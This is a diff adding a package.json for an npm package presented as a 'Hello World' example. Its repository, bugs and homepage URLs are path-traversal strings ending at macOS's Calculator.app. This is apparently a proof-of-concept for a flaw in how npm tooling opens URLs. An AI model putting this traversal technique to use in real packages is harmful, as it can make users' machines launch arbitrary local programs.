@@ -1,0 +1,28 @@
+{
+  "name": "hello-world-npmx",
+  "version": "1.1.0",
+  "description": "Hello World NPM example",
+  "main": "lib/index.js",
+  "man": "./README.md",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1"
+  },
+  "repository": {
+    "type": "git",
+    "url": " https:github.com/../../../../../../../../../../../../System/Applications/Calculator.app"
+  },
+  "keywords": [
+    "hello",
+    "world",
+    "hello-world"
+  ],
+  "bin": {
+    "hello-world-npmx": "./bin.js"
+  },
+  "author": "trungPa",
+  "license": "MIT",
+  "bugs": {
+    "url": " https:github.com/../../../../../../../../../../../../System/Applications/Calculator.app"
+  },
+  "homepage": " https:github.com/../../../../../../../../../../../../System/Applications/Calculator.app"
+}
